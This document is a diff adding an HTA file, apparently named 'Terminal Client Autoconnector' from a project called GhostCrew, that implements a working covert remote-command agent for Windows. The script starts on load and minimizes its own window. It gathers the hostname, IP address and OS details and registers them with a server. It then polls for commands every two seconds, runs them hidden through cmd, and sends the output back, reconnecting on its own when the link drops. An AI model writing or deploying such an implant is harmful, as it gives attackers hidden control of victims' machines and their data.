@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Terminal Client Autoconnector</title>
+    <HTA:APPLICATION
+        ID="TerminalAutoConnector"
+        APPLICATIONNAME="Terminal Client Autoconnector"
+        BORDER="thin"
+        BORDERSTYLE="normal"
+        CAPTION="yes"
+        ICON="shell32.dll,23"
+        MAXIMIZEBUTTON="no"
+        MINIMIZEBUTTON="yes"
+        SCROLL="no"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="yes"
+        SYSMENU="yes"
+        VERSION="2.0"
+        WINDOWSTATE="minimize"
+        NAVIGABLE="no"
+    />
+    <style>
+        body {
+            font-family: Consolas, monospace;
+            background-color: #000;
+            color: #0f0;
+            padding: 5px;
+            margin: 0;
+            overflow: hidden;
+        }
+        .log {
+            height: 200px;
+            overflow-y: auto;
+            font-size: 11px;
+            line-height: 1.3;
+        }
+        .status {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 5px;
+            background-color: #333;
+            border-top: 1px solid #0f0;
+            font-size: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="log" id="log"></div>
+    <div class="status" id="status">Initializing...</div>
+
+    <script>
+        // Config
+        var SERVER_URL = "http://localhost/GhostCrew/api.php";
+        var POLL_INTERVAL = 2000; // 2 seconds
+        var AUTO_RECONNECT = true;
+        
+        // Variables
+        var hostId = null;
+        var currentSessionId = null;
+        var pollTimer = null;
+        var isConnected = false;
+        var reconnectAttempts = 0;
+        var lastCommandTime = 0;
+        var shellProcess = null;
+        var currentDirectory = null;
+        var environmentVars = {};
+        
+        // Initialize on load
+        window.onload = function() {
+            initAutoConnect();
+            
+            // Auto-minimize after brief delay
+            setTimeout(function() {
+                try {
+                    window.resizeTo(400, 250);
+                    setTimeout(function() {
+                        window.blur();
+                    }, 2000);
+                } catch(e) {
+                    logMessage("Error resizing window: " + e.message);
+                }
+            }, 500);
+        };
+        
+        function initAutoConnect() {
+            logMessage("Terminal Auto-Connector v2.0 starting...");
+            logMessage("Enhanced with persistent shell support");
+            
+            // Check if previously connected
+            var savedHostId = localStorage.getItem("hostId");
+            if (savedHostId) {
+                hostId = savedHostId;
+                logMessage("Found previous connection ID: " + hostId);
+            }
+            
+            // Initialize shell environment
+            initializeShell();
+            
+            // Start connection immediately
+            connect();
+        }
+        
+        function initializeShell() {
+            try {
+                // Create persistent shell object
+                shellProcess = new ActiveXObject("WScript.Shell");
+                
+                // Get initial working directory
+                currentDirectory = shellProcess.ExpandEnvironmentStrings("%CD%");
+                logMessage("Shell initialized. Working directory: " + currentDirectory);
+                
+                // Store common environment variables
+                var commonEnvVars = ["PATH", "TEMP", "USERPROFILE", "COMPUTERNAME", "USERNAME"];
+                for (var i = 0; i < commonEnvVars.length; i++) {
+                    try {
+                        environmentVars[commonEnvVars[i]] = shellProcess.ExpandEnvironmentStrings("%" + commonEnvVars[i] + "%");
+                    } catch(e) {
+                        // Skip if env var doesn't exist
+                    }
+                }
+                
+            } catch (e) {
+                logMessage("Error initializing shell: " + e.message);
+            }
+        }
+        
+        function connect() {
+            updateStatus("Connecting to server...");
+            logMessage("Attempting connection to server...");
+            
+            // Get system information
+            var systemInfo = getSystemInfo();
+            
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", SERVER_URL, true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        try {
+                            var response = JSON.parse(xhr.responseText);
+                            if (response.status === "success") {
+                                hostId = response.host_id;
+                                localStorage.setItem("hostId", hostId);
+                                
+                                updateStatus("Connected as " + systemInfo.hostname);
+                                logMessage("Successfully connected with ID: " + hostId);
+                                
+                                // Start polling for commands
+                                isConnected = true;
+                                reconnectAttempts = 0;
+                                lastCommandTime = new Date().getTime();
+                                startPolling();
+                            } else {
+                                handleConnectionError("Server returned error: " + response.message);
+                            }
+                        } catch (e) {
+                            handleConnectionError("Error parsing server response: " + e.message);
+                        }
+                    } else {
+                        handleConnectionError("Server returned status: " + xhr.status);
+                    }
+                }
+            };
+            
+            xhr.onerror = function() {
+                handleConnectionError("Network error occurred");
+            };
+            
+            // Build data to send
+            var formData = "action=register_host";
+            if (hostId) {
+                formData += "&host_id=" + encodeURIComponent(hostId);
+            }
+            formData += "&hostname=" + encodeURIComponent(systemInfo.hostname);
+            formData += "&ip_address=" + encodeURIComponent(systemInfo.ipAddress);
+            formData += "&os_info=" + encodeURIComponent(systemInfo.osInfo);
+            
+            // Send request
+            xhr.send(formData);
+        }
+        
+        function startPolling() {
+            // Clear any existing interval
+            stopPolling();
+            
+            // Start new polling interval
+            pollTimer = setInterval(pollForCommands, POLL_INTERVAL);
+            logMessage("Started polling for commands (every " + (POLL_INTERVAL/1000) + " seconds)");
+            
+            // Set up watchdog timer
+            setInterval(function() {
+                var now = new Date().getTime();
+                if (isConnected && (now - lastCommandTime > 300000)) {
+                    logMessage("No activity for 5 minutes, checking connection...");
+                    pingServer();
+                }
+            }, 60000);
+        }
+        
+        function stopPolling() {
+            if (pollTimer) {
+                clearInterval(pollTimer);
+                pollTimer = null;
+                logMessage("Stopped polling for commands");
+            }
+        }
+        
+        function pollForCommands() {
+            if (!isConnected || !hostId) return;
+            
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", SERVER_URL, true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        try {
+                            var response = JSON.parse(xhr.responseText);
+                            if (response.status === "success") {
+                                lastCommandTime = new Date().getTime();
+                                
+                                if (response.command && response.command !== "") {
+                                    logMessage("Received command: " + response.command);
+                                    
+                                    // Check if this is a new session
+                                    if (response.session_id && response.session_id !== currentSessionId) {
+                                        logMessage("New session started: " + response.session_id);
+                                        currentSessionId = response.session_id;
+                                        // Reset shell environment for new session
+                                        resetShellEnvironment();
+                                    }
+                                    
+                                    executeCommand(response.command_id, response.command, response.session_id);
+                                }
+                            } else {
+                                logMessage("Error polling for commands: " + response.message);
+                            }
+                        } catch (e) {
+                            logMessage("Error parsing command response: " + e.message);
+                        }
+                    } else {
+                        logMessage("Server error while polling: " + xhr.status);
+                        if (AUTO_RECONNECT) {
+                            isConnected = false;
+                            attemptReconnect();
+                        }
+                    }
+                }
+            };
+            
+            xhr.onerror = function() {
+                logMessage("Network error while polling for commands");
+                if (AUTO_RECONNECT) {
+                    isConnected = false;
+                    attemptReconnect();
+                }
+            };
+            
+            xhr.send("action=get_command&host_id=" + encodeURIComponent(hostId));
+        }
+        
+        function resetShellEnvironment() {
+            try {
+                // Reset to system drive root
+                var systemDrive = shellProcess.ExpandEnvironmentStrings("%SystemDrive%");
+                currentDirectory = systemDrive + "\\";
+                logMessage("Shell environment reset for new session. Working directory: " + currentDirectory);
+            } catch (e) {
+                logMessage("Error resetting shell environment: " + e.message);
+            }
+        }
+        
+        function executeCommand(commandId, command, sessionId) {
+            logMessage("Executing command: " + command);
+            updateStatus("Running: " + command);
+            
+            var startTime = new Date().getTime();
+            var output = "";
+            var success = true;
+            
+            try {
+                // Handle special commands that affect shell state
+                if (command.toLowerCase().startsWith("cd ")) {
+                    output = handleChangeDirectory(command);
+                } else if (command.toLowerCase().startsWith("set ")) {
+                    output = handleSetEnvironmentVariable(command);
+                } else if (command.toLowerCase() === "pwd" || command.toLowerCase() === "cd") {
+                    output = currentDirectory;
+                } else {
+                    // Execute regular command with persistent context
+                    output = executeCommandWithContext(command);
+                }
+                
+            } catch (e) {
+                output = "Error: " + e.message;
+                success = false;
+                logMessage("Error executing command: " + e.message);
+            }
+            
+            var endTime = new Date().getTime();
+            var executionTime = (endTime - startTime) / 1000;
+            
+            // Send the result back to the server
+            submitCommandResult(commandId, output, executionTime);
+            updateStatus("Connected - Last command: " + new Date().toLocaleTimeString());
+        }
+        
+        function handleChangeDirectory(command) {
+            try {
+                var newPath = command.substring(3).trim();
+                if (newPath === "") {
+                    return currentDirectory;
+                }
+                
+                // Handle relative paths
+                var fullPath;
+                if (newPath.indexOf(":") === -1 && !newPath.startsWith("\\")) {
+                    fullPath = currentDirectory + "\\" + newPath;
+                } else {
+                    fullPath = newPath;
+                }
+                
+                // Normalize path
+                fullPath = shellProcess.ExpandEnvironmentStrings(fullPath);
+                
+                // Check if directory exists using FSO
+                var fso = new ActiveXObject("Scripting.FileSystemObject");
+                if (fso.FolderExists(fullPath)) {
+                    currentDirectory = fullPath;
+                    if (!currentDirectory.endsWith("\\")) {
+                        currentDirectory += "\\";
+                    }
+                    return currentDirectory;
+                } else {
+                    return "The system cannot find the path specified.";
+                }
+                
+            } catch (e) {
+                return "Error changing directory: " + e.message;
+            }
+        }
+        
+        function handleSetEnvironmentVariable(command) {
+            try {
+                var parts = command.substring(4).split("=");
+                if (parts.length >= 2) {
+                    var varName = parts[0].trim();
+                    var varValue = parts.slice(1).join("=").trim();
+                    
+                    // Store in our environment tracking
+                    environmentVars[varName] = varValue;
+                    
+                    return "Environment variable " + varName + " set.";
+                } else {
+                    return "Invalid SET command syntax.";
+                }
+            } catch (e) {
+                return "Error setting environment variable: " + e.message;
+            }
+        }
+        
+        function executeCommandWithContext(command) {
+            try {
+                var fso = new ActiveXObject("Scripting.FileSystemObject");
+                
+                // Create a unique temporary file for this command
+                var tempFile = shellProcess.ExpandEnvironmentStrings("%TEMP%\\cmd_output_" + new Date().getTime() + "_" + Math.random().toString(36).substr(2, 9) + ".txt");
+                
+                // Build command with current directory context
+                var contextualCommand = "cd /d \"" + currentDirectory + "\" && " + command;
+                
+                // Add environment variables to command if any were set
+                var envPrefix = "";
+                for (var envVar in environmentVars) {
+                    if (environmentVars.hasOwnProperty(envVar)) {
+                        envPrefix += "set " + envVar + "=" + environmentVars[envVar] + " && ";
+                    }
+                }
+                
+                if (envPrefix) {
+                    contextualCommand = envPrefix + contextualCommand;
+                }
+                
+                // Execute command and capture output
+                var fullCommand = "cmd /c \"" + contextualCommand + "\" > \"" + tempFile + "\" 2>&1 && echo. && cd";
+                
+                // Execute and wait for completion
+                shellProcess.Run(fullCommand, 0, true);
+                
+                var output = "";
+                
+                // Read the output
+                if (fso.FileExists(tempFile)) {
+                    var file = fso.OpenTextFile(tempFile, 1);
+                    var content = file.ReadAll();
+                    file.Close();
+                    
+                    // Parse output to extract directory change
+                    var lines = content.split("\r\n");
+                    var lastLine = "";
+                    var outputLines = [];
+                    
+                    for (var i = 0; i < lines.length; i++) {
+                        var line = lines[i];
+                        if (line.trim() !== "") {
+                            lastLine = line.trim();
+                            outputLines.push(line);
+                        }
+                    }
+                    
+                    // Check if the last line looks like a directory path (from the 'cd' command)
+                    if (lastLine && lastLine.indexOf(":") !== -1 && lastLine.indexOf("\\") !== -1) {
+                        // Update current directory
+                        currentDirectory = lastLine;
+                        if (!currentDirectory.endsWith("\\")) {
+                            currentDirectory += "\\";
+                        }
+                        // Remove the directory line from output
+                        outputLines.pop();
+                    }
+                    
+                    output = outputLines.join("\r\n");
+                    
+                    // Clean up temp file
+                    try {
+                        fso.DeleteFile(tempFile);
+                    } catch (e) {
+                        // Ignore deletion errors
+                    }
+                }
+                
+                return output || "Command executed successfully.";
+                
+            } catch (e) {
+                return "Error executing command: " + e.message;
+            }
+        }
+        
+        function submitCommandResult(commandId, output, executionTime) {
+            logMessage("Sending command result back to server...");
+            
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", SERVER_URL, true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        try {
+                            var response = JSON.parse(xhr.responseText);
+                            if (response.status === "success") {
+                                logMessage("Command result sent successfully");
+                            } else {
+                                logMessage("Error sending command result: " + response.message);
+                            }
+                        } catch (e) {
+                            logMessage("Error parsing submit result response: " + e.message);
+                        }
+                    } else {
+                        logMessage("Server error while sending command result: " + xhr.status);
+                    }
+                }
+            };
+            
+            // Build data to send
+            var formData = "action=submit_result";
+            formData += "&command_id=" + encodeURIComponent(commandId);
+            formData += "&output=" + encodeURIComponent(output);
+            formData += "&execution_time=" + encodeURIComponent(executionTime);
+            
+            xhr.send(formData);
+        }
+        
+        function pingServer() {
+            if (!hostId) return;
+            
+            logMessage("Pinging server to verify connection...");
+            
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", SERVER_URL, true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        try {
+                            var response = JSON.parse(xhr.responseText);
+                            if (response.status === "success") {
+                                logMessage("Connection verified with server");
+                                lastCommandTime = new Date().getTime();
+                            } else {
+                                logMessage("Server returned error during ping: " + response.message);
+                                if (AUTO_RECONNECT) {
+                                    isConnected = false;
+                                    attemptReconnect();
+                                }
+                            }
+                        } catch (e) {
+                            logMessage("Error parsing ping response: " + e.message);
+                            if (AUTO_RECONNECT) {
+                                isConnected = false;
+                                attemptReconnect();
+                            }
+                        }
+                    } else {
+                        logMessage("Server error during ping: " + xhr.status);
+                        if (AUTO_RECONNECT) {
+                            isConnected = false;
+                            attemptReconnect();
+                        }
+                    }
+                }
+            };
+            
+            xhr.onerror = function() {
+                logMessage("Network error during ping");
+                if (AUTO_RECONNECT) {
+                    isConnected = false;
+                    attemptReconnect();
+                }
+            };
+            
+            xhr.send("action=ping_host&host_id=" + encodeURIComponent(hostId));
+        }
+        
+        function attemptReconnect() {
+            if (reconnectAttempts >= 5) {
+                updateStatus("Reconnection failed after 5 attempts");
+                logMessage("Giving up after 5 reconnection attempts");
+                return;
+            }
+            
+            reconnectAttempts++;
+            var delay = reconnectAttempts * 5000;
+            
+            updateStatus("Connection lost. Reconnecting in " + (delay/1000) + "s...");
+            logMessage("Attempting to reconnect in " + (delay/1000) + " seconds (attempt " + reconnectAttempts + "/5)");
+            
+            // Reset session on reconnect
+            currentSessionId = null;
+            
+            setTimeout(function() {
+                connect();
+            }, delay);
+        }
+        
+        function getSystemInfo() {
+            var info = {
+                hostname: "",
+                ipAddress: "127.0.0.1",
+                osInfo: ""
+            };
+            
+            try {
+                var network = new ActiveXObject("WScript.Network");
+                info.hostname = network.ComputerName;
+                
+                var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
+                var osItems = new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem"));
+                
+                for (; !osItems.atEnd(); osItems.moveNext()) {
+                    var osItem = osItems.item();
+                    info.osInfo = osItem.Caption + " " + osItem.Version + " (" + osItem.OSArchitecture + ")";
+                    break;
+                }
+                
+                var nicItems = new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True"));
+                
+                for (; !nicItems.atEnd(); nicItems.moveNext()) {
+                    var nicItem = nicItems.item();
+                    var ipAddresses = new VBArray(nicItem.IPAddress).toArray();
+                    
+                    for (var i = 0; i < ipAddresses.length; i++) {
+                        var ip = ipAddresses[i];
+                        if (ip.indexOf(".") > 0 && ip !== "127.0.0.1") {
+                            info.ipAddress = ip;
+                            break;
+                        }
+                    }
+                    
+                    if (info.ipAddress !== "127.0.0.1") {
+                        break;
+                    }
+                }
+            } catch (e) {
+                logMessage("Error collecting system info: " + e.message);
+            }
+            
+            logMessage("System info: " + info.hostname + " (" + info.ipAddress + "), " + info.osInfo);
+            return info;
+        }
+        
+        function updateStatus(message) {
+            document.getElementById("status").innerHTML = message;
+            document.title = "Terminal Client - " + message;
+        }
+        
+        function logMessage(message) {
+            var now = new Date();
+            var timestamp = now.toLocaleTimeString();
+            var logEl = document.getElementById("log");
+            logEl.innerHTML += "[" + timestamp + "] " + message + "<br>";
+            logEl.scrollTop = logEl.scrollHeight;
+            
+            var logLines = logEl.innerHTML.split("<br>");
+            if (logLines.length > 100) {
+                logEl.innerHTML = logLines.slice(logLines.length - 100).join("<br>");
+            }
+        }
+        
+        function handleConnectionError(message) {
+            updateStatus("Connection failed");
+            logMessage("Connection error: " + message);
+            
+            if (AUTO_RECONNECT) {
+                attemptReconnect();
+            }
+        }
+        
+        window.onbeforeunload = function() {
+            if (isConnected) {
+                try {
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", SERVER_URL, false);
+                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                    xhr.send("action=ping_host&host_id=" + encodeURIComponent(hostId));
+                } catch(e) {
+                    // Ignore errors during close
+                }
+            }
+        };
+    </script>
+</body>
+</html>
